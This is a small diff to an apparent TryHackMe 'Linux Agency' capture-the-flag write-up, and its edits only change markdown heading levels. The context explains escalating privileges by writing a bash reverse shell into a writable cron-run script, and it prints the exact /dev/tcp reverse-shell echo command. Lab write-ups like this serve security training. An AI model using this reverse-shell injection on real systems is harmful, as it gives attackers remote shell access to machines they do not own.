@@ -94,14 +94,14 @@ writ up: https://waqar-arain.netlify.app/tryhackme/linux-agency/
 
 # Task 4
 
-#### Diana's flag
+### Diana's flag
 
 *Well this flag is related to a scheduled process of it happens it executes an `sh` file that you have a read and write permissions on, so the way to get this flag is to put a `bash` reverse shell script in that file and listen till it runs and you get to the shell that has the flag.*
 - [Bash Rev-shell scripts](https://gtfobins.github.io/gtfobins/bash/)
 
 So, the **first** thing is to find where the script is, there are two ways:
 
-##### The hard and luck based way 
+#### The hard and luck based way 
 
 lets search for it by the `find` command by searching for all the files that `Viktor` owns, and the `47.sh` is the target file.
 
@@ -116,3 +116,5 @@ echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > /opt/scripts/47.sh
 ```
 
 And wait till the scheduled process runs the script file.  
+
+##### 
